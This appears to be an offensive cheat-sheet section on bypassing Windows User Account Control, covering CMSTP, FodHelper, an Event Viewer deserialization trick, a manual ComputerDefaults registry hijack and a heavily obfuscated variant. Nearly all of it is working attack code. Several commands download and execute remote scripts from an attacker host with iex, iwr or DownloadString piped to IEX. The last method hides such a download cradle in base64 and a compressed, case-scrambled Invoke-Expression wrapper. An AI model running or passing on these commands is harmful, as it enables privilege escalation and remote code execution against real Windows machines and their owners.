### **UAC Bypass**

**Using CMSTP**

```powershell
# Download the code from GitHub and then invoke it directly in memory
iex(iwr http://[ATTACKER_IP]/cmstp.ps1 -useb)

# Execute it
Bypass-UAC -Command "curl http://[ATTACKER_IP]/worked"

```

- [GitHub Reference](https://github.com/expl0itabl3/uac-bypass-cmstp)

**Using FodHelper**

```powershell
# Download the code from GitHub and then execute in
iwr -uri http://[ATTACKER_IP]/improved-fodhelper.ps1 -outfile C:\\Windows\\Tasks\\improved-fodhelper.ps1

# Run it
./improved-fodhelper.ps1

```

**Using EventViewer**

```powershell
# RCE through Unsafe .Net Deserialization in Windows Event Viewer which leads to UAC bypass.

# Upload it to the victim
Import-Module .\Invoke-EventViewer.ps1

Invoke-EventViewer
[-] Usage: Invoke-EventViewer commandhere
Example: Invoke-EventViewer cmd.exe

PS C:\Windows\Tasks> Invoke-EventViewer cmd.exe
[+] Running
[1] Crafting Payload
[2] Writing Payload
[+] EventViewer Folder exists
[3] Finally, invoking eventvwr

```

- [GitHub Reference](https://github.com/CsEnox/EventViewer-UACBypass)

**Using Manual Approach - ComputerDefaults**

```powershell
New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe /c curl http://192.168.50.149/worked" -Force
Start-Process "C:\Windows\System32\ComputerDefaults.exe"

```

**Heavily Obfuscated UAC Bypass**

1. Prepare the command to be executed

```powershell
$ipAddress = (ip addr show tun0 | grep inet | head -n 1 | cut -d ' ' -f 6 | cut -d '/' -f 1)
$text = "(New-Object System.Net.WebClient).DownloadString('http://$ipAddress/run3.txt') | IEX"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
$EncodedText = [Convert]::ToBase64String($bytes)
$EncodedText
exit

```

1. Encode your command

```bash
(New-Object System.Net.WebClient).DownloadString('http://[ATTACKER_IP]/run3.txt') | IEX

echo -en '(New-Object System.Net.WebClient).DownloadString("http://[ATTACKER_IP]/run3.txt") | IEX' | iconv -t UTF-16LE | base64 -w 0

```

1. Insert the Base64 blob into the `code` variable like the below

```powershell
# The result from the previous command
$code = "KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA3AC8AcgB1AG4AMwAuAHQAeAB0ACcAKQAgAHwAIABJAEUAWAA="

```

1. Create the `Bypass` function

```powershell
function Bypass {
[CmdletBinding()]
param (
[Parameter (Position=0, Mandatory = $True)]
[string]$code )

(nEw-OBJECt  Io.CoMpreSsion.DEflateSTrEaM( [SyStem.io.memoRYSTReaM][convErT]::fromBaSE64STriNg( 'hY49C8IwGIT/ykvoGjs4FheLqIgfUHTKEpprK+SLJFL99zYFwUmXm+6ee4rzcbti3o0IcYDWCzxBfKSB+Mldctg98c0TLa1fXsZIHLalonUKxKqAnqRSxHaH+ioa16VRBohaT01EsXCmF03mirOHFa0zRlrFqFRUTM9Udv8QJvKIlO62j6J+hBvCvGYZzfK+c2o68AhZvWqSDIk3GvDEIy1nvIJGwk9J9l3f22mSdv') ,[SysTEM.io.COMpResSion.coMPRESSIONMoDE]::DeCompress ) | ForeacH{nEw-OBJECt Io.StReaMrEaDer( $_,[SySTEM.teXT.enCOdING]::aSciI )}).rEaDTOEnd( ) | InVoKE-expREssION
}

```

1. Execute the code

```powershell
Bypass $code

```

- [GitHub Reference](https://github.com/I-Am-Jakoby/PowerShell-for-Hackers/blob/main/Functions/UAC-Bypass.md)
